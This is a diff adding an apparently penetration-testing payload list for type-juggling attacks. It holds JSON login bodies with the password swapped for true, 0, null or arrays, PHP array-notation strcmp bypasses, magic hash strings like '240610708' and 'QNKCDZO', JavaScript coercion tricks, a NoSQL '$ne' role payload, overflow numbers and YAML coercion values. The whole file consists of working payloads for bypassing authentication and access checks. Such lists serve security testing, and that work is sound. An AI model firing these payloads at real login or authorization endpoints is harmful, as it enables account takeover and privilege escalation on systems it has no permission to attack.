@@ -1,0 +1,146 @@
+# Type Juggling Payloads
+
+# JSON type substitution for a string field (password, token, code, id)
+{"username":"admin","password":true}
+{"username":"admin","password":0}
+{"username":"admin","password":null}
+{"username":"admin","password":[]}
+{"username":"admin","password":{}}
+{"username":"admin","password":["a"]}
+{"username":"admin","password":0.0}
+{"username":"admin","password":"0"}
+{"username":"admin","password":"0e0"}
+{"username":"admin","password":-1}
+{"username":"admin","password":1e999}
+{"token":true}
+{"token":0}
+{"token":[]}
+{"code":0}
+{"code":true}
+{"otp":0}
+{"otp":true}
+{"otp":[0,1,2,3,4,5,6,7,8,9]}
+
+# Form array notation (PHP: strcmp(array, string) returns NULL, which == 0)
+password[]=x
+password[]=
+password[a]=b
+token[]=x
+user[]=admin
+username[]=admin&password[]=x
+code[]=0
+
+# PHP loose comparison: values that equal 0 or other numbers with ==
+00
+0.0
+-0
+" 0"
+"0 "
+"0x0"
+"0e0"
+"abc"
+"1abc"
+"1e3"
+"1000"
+"0.0"
+"null"
+"false"
+"true"
+"NaN"
+"INF"
+
+# PHP magic hash strings: the digest starts with 0e followed only by digits, so == treats it as 0
+# MD5
+240610708
+QNKCDZO
+aabg7XSs
+aabC9RqS
+0e215962017
+# SHA1
+10932435112
+aaroZmOk
+aaK1STfY
+aaO8zKZF
+aa3OFF9m
+# SHA-256 (0e + 62 digits)
+34250003024812
+TyNOQHUS
+# SHA-224
+10885164793773
+# Strings that equal their own 0e md5 comparison
+md5('240610708') == md5('QNKCDZO')
+sha1('10932435112') == sha1('aaroZmOk')
+
+# Magic hash comparison targets (when the stored hash is 0e... and the input hashes to 0e...)
+0e462097431906509019562988736854
+0e291242476940776845150308577824
+
+# in_array / array_search loose matching
+true
+"1"
+"0e1"
+
+# switch and == in PHP 7 and below: comparing "abc" == 0 is true
+abc
+
+# PHP 8 changes: "abc" == 0 is false, but numeric strings still juggle
+"1e3" == "1000"
+"0x1A" == "26"
+"10" == "1e1"
+"100" == "1e2"
+" 1" == "1"
+"1 " == "1"
+
+# strcmp / strncmp bypass with an array (PHP < 8 returns NULL and a warning)
+
+# JavaScript loose equality and coercion
+"0" == false
+"" == 0
+null == undefined
+[] == false
+[0] == false
+[1] == true
+[] == ![]
+"1,2" == [1,2]
+NaN != NaN
+{"a":1} == "[object Object]"
+parseInt("0x10")
+parseInt("08")
+Number("")
+Number(" 12 ")
+Number("1e3")
++[]
++{}
++"3"
+
+# JavaScript truthiness bypass patterns
+{"isAdmin":"false"}
+{"isAdmin":"0"}
+{"isAdmin":[]}
+{"isAdmin":{}}
+{"role":["admin"]}
+{"role":{"$ne":"user"}}
+
+# Numeric overflow and precision
+9007199254740993
+9223372036854775808
+18446744073709551616
+-9223372036854775809
+0.1+0.2
+1e308
+2147483648
+4294967296
+
+# YAML and query-string coercion
+password: yes
+password: no
+password: null
+password: 0o12
+password: 0x1F
+password: 1_000
+password: !!int "1"
+password: !!float "1"
+a[b]=1&a[b][c]=2
+a=1&a[]=2
+
+# Python / Ruby / Go notes (reference): comparisons such as True == 1, 1 == 1.0, "" in "abc" , nil.to_s == "", 0 == "0" (Ruby false), bool("False") (Python True)
